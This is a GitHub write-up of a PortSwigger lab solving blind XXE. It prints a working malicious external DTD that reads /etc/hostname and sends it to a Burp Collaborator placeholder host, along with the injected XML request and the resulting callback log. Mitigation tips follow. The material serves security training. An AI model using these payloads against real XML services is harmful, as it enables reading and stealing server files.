
### 📁 `README.md` — Blind XXE + Malicious External DTD

# 📤 Blind XXE: Exfiltrating Data via Malicious External DTD

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** Blind XXE with External DTD  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Exfiltrate the contents of `/etc/hostname` using a crafted DTD and out-of-band interaction.

---

## 🔍 Lab Summary

This lab simulates a blind **XXE (XML External Entity)** vulnerability with:
- No visible output in the response
- Local file read capability
- Support for **external parameter entities**
- An **exploit server** or **Burp Collaborator** for data exfiltration

The challenge: use a **malicious external DTD** to exfiltrate the contents of `/etc/hostname`.

---

## ⚙️ Exploitation Workflow

### 1. 🧰 Create a Malicious DTD

Go to the **Exploit Server** and store this malicious DTD file:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
````

Replace `BURP-COLLABORATOR-SUBDOMAIN` with your real **Burp Collaborator payload**
🧠 Tip: In Burp Suite Pro, go to Collaborator tab → "Copy to clipboard"

---

### 2. 🔗 Save and Note the DTD URL

Click **“View exploit”** to get the **full URL** of the hosted DTD file, e.g.:

```
https://exploit-acad1234.web-security-academy.net/dtd.xml
```

---

### 3. 🚨 Inject the External DTD in XML Request

Intercept the “Check stock” POST request and modify the XML payload like so:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-acad1234.web-security-academy.net/dtd.xml">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

This triggers:

* `file:///etc/hostname` is read via `%file`
* Its content is sent to your Burp Collaborator endpoint via `%exfil`

---

### 4. 📡 Monitor the Collaborator Tab

* Click **“Poll now”**
* Look for HTTP interactions like:

```
GET /?x=ip-10-15-0-12 HTTP/1.1
Host: burp-collaborator.net
```

Success! 🎯 The hostname was exfiltrated using blind XXE.
![XXE](https://github.com/Kabilala/xxe/blob/main/lab5/lab5.png)
---

## 🧠 Technical Breakdown

| Element                        | Purpose                                  |
| ------------------------------ | ---------------------------------------- |
| `<!ENTITY % xxe SYSTEM "...">` | Loads the malicious DTD file             |
| `%file`                        | Reads local file from server             |
| `%eval; %exfil;`               | Defines and triggers exfiltration entity |
| Burp Collaborator              | Receives OOB data from vulnerable server |

---

## 🔐 Mitigation Strategies

* ❌ Disable external entity resolution in XML parsers
* ✅ Use secure XML libraries (e.g., `defusedxml`, secure XMLFactory features)
* 🔐 Enforce network egress filtering to block OOB exfil
* 🚨 Monitor internal systems for unexpected DNS/HTTP traffic

---

## 📚 References

* [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe/blind/exfil)
* [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PayloadsAllTheThings – XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
---